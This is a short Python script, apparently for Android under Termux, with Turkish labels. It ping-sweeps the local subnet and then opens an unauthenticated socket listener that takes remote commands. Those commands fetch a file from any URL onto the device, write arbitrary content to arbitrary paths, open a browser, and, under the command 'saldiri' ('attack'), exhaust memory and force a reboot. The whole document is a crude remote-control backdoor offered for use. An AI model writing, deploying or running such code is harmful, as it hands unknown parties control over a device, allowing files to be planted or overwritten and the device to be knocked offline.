
import socket
import os
import urllib.request
import subprocess
import time

def get_gateway():
    try:
        out = subprocess.check_output("ip route", shell=True).decode()
        for line in out.splitlines():
            if "default via" in line:
                return line.split()[2]
    except:
        return "192.168.1.1"

def scan_network(gateway):
    base = ".".join(gateway.split(".")[:3])
    aktifler = []
    print("[*] Ağ taranıyor...")
    for i in range(1, 255):
        ip = f"{base}.{i}"
        res = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        if res == 0:
            aktifler.append(ip)
            if len(aktifler) >= 100:
                break
    return aktifler

def start_server(port):
    s = socket.socket()
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"[+] Dinleniyor: 0.0.0.0:{port}")
    conn, addr = s.accept()
    print(f"[✓] Komut geldi: {addr[0]}")
    while True:
        try:
            komut = conn.recv(2048).decode().strip()
            if komut.startswith("arkaplan "):
                url = komut.split(" ", 1)[1]
                yol = "/sdcard/Download/bg.jpg"
                urllib.request.urlretrieve(url, yol)
                os.system(f"termux-wallpaper -f {yol}")
                conn.send("[✓] Arka plan degistirildi\n".encode())

            elif komut == "saldiri":
                for _ in range(5000000): _ = "x" * 1000
                os.system("reboot")

            elif komut == "google":
                os.system("am start -a android.intent.action.VIEW -d https://www.google.com")
                conn.send("[✓] Google acildi\n".encode())

            elif komut.startswith("dosya "):
                _, yol, icerik = komut.split(" ", 2)
                with open(yol, "w") as f:
                    f.write(icerik)
                conn.send(f"[✓] Dosya olusturuldu: {yol}\n".encode())

            else:
                conn.send("[!] Gecersiz komut\n".encode())

        except Exception as e:
            try:
                conn.send(f"[!] Hata: {str(e)}\n".encode())
            except:
                break
    conn.close()
    s.close()

if __name__ == "__main__":
    port = int(input("Port gir: "))
    modem = get_gateway()
    print(f"[*] Modem IP: {modem}")
    aktifler = scan_network(modem)
    print("[*] Aktif IP'ler:")
    for i, ip in enumerate(aktifler, 1):
        print(f"[{i}] {ip}")
    print("[✓] Bekleniyor...")
    start_server(port)
